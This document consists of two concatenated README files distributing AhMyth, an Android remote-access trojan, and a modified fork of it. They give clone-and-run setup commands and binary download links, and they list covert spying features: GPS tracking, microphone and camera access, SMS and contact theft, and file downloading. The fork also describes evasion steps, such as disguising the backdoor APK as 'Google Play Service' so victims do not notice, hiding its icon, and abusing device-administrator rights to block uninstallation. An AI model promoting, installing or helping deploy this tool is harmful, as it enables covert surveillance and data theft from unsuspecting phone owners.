# AhMyth Android Rat
###### Beta Version
It consists of two parts :
* Server side : desktop application based on electron framework (control panel)
* Client side : android application (backdoor)


## Getting Started
### You have two options to install it
#### 1) From source code
###### Prerequisite :
* Electron (to start the app)
* Java (to generate apk backdoor)
* Electron-builder and electron-packer (to build binaries for (OSX,WINDOWS,LINUX))
1. ```git clone https://github.com/AhMyth/AhMyth-Android-RAT.git```
2. ```cd AhMyth-Android-RAT/AhMyth-Server```
3. ```npm start```

#### 2) From binaries
###### Prerequisite :
* Download a binary from https://github.com/AhMyth/AhMyth-Android-RAT/releases
* Java (to generate apk backdoor)

## Screenshots
<p align="center">
  <img src="http://i.imgur.com/HM3uXL6.png" width="600"/>
</p>

---------------------------------------------------------------

<p align="center">
  <img src="http://i.imgur.com/nHTGGHi.png" width="600"/>
</p>

---------------------------------------------------------------

<p align="center">
  <img src="http://i.imgur.com/XVXCHV9.png" width="600"/>
</p>


## Video Tutorial
<p align="center">
<a href="https://www.youtube.com/watch?v=DDIZTABABzs">
  <img src="https://img.youtube.com/vi/DDIZTABABzs/0.jpg" width="600"/>
</a></p>


---------------------------------------------------------------
##### I will not be responsible for any direct or indirect damage caused due to the usage of this tool, it is for educational purposes only.
###### Twitter : <a href="https://twitter.com/AhMythDev"> @AhMythDev </a>
###### Bitcoin address for donations:  : 1EVwLuwmbsEuej7qJnNquFeQJLsgd2b8Lq

# AhMyth-Modified-Version
AhMyth is an popular open source android rat. But the official AhMyth contains many bugs. For an example, you can't fetch victim's files from the remote server using official AhMyth. So that we have modified the rat and remove all bugs and also added some extra features. 

### It consists of two parts :

- Server side : desktop application based on electron framework (control panel)
- Client side : android application (backdoor)

## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- File Explorer & Downloader
- Built In APK Builder
- Camera Access

## What's new and fixed bugs
- Fetch files bug fixes
- Device administrator permission added that normal users can not uninstall the payload
- Fetching victim's location bug fixes
- The name of the apk file has been changed to Google Play Service so that the victim does not understand that it is a payload.
- Also has been changed the apk icon.
- Android 10 and 11 supported
- App icon will hide if the victim's phone's android version is below android 10. (That's why device admin permission added to prevent uninstallation)
- Now penetration tester can manually hide and unhide app icon (If victim's android version is below Android 10 then the hide/unhide button will show)
- To unhide app icon, dial *55555# and apk icon will be unhidden.

## Notice
 - Due to the background limitation of Android 10 and 11, the started service has been removed and the foreground service has been added. So you should turn off the application notification from the setting.

## Prerequisites
- Open JDK 8 (to generate apk backdoor)

## Getting Started

### You have two options to install it

#### 1) From source code

##### Prerequisites
 - Electron (to start the app)
 - Open JDK 8
 - Node.js (Node.js Package Manager)
 - Electron-packer (to build binaries for (OSX,WINDOWS,LINUX))
 - `git clone https://github.com/HiddenPirates/AhMyth-Modified-Version.git`
 - `cd AhMyth-Modified-Version/AhMyth-Server`
 - `npm install electron-builder --save-dev`
 - `npm start`
 
#### 2) From binaries

 ##### Prerequisites
 - Download binary for windows x64 from <a href="https://hidden-pirates.blogspot.com/2021/01/AhMyth-Modified-Version-By-Hidden-Pirates.html">here.</a>
 - Open JDK 8 (to generate apk backdoor)
 
## Screenshots

<img width="600" style="max-width: 100%;" src="https://camo.githubusercontent.com/ee646819f13b7aa148ff2e15e55b4fd6d5406729f52723528956f55201389dcd/68747470733a2f2f692e6962622e636f2f363439383037772f73706c6173682e706e67" /> 
<br>
<img width="600" style="max-width: 100%;" src="https://camo.githubusercontent.com/79e87069d44474f85c676b82bd97881cd01ee455c1f8d7d41310e7e37184177e/687474703a2f2f692e696d6775722e636f6d2f6e4854474748692e706e67" />
<br>
<img width="600" style="max-width: 100%;" src="https://camo.githubusercontent.com/6cae421e020950f807ee46c776fbce6e686185c8339f46b9a8503e89f9b64303/687474703a2f2f692e696d6775722e636f6d2f585658434856392e706e67" />

##### I will not be responsible for any direct or indirect damage caused due to the usage of this tool, it is for educational purposes only. So use it for good movement only.

#### Google Play Store Profile : <a href="https://play.google.com/store/apps/dev?id=5002650060821952731"> @Google Play Store </a>

#### Join Our Facebook Group : <a href="https://www.facebook.com/groups/hiddenpirates/"> @Facebook </a>

#### Our Official Website : <a href="http://hidden-pirates.blogspot.com"> @Hidden Pirates </a>
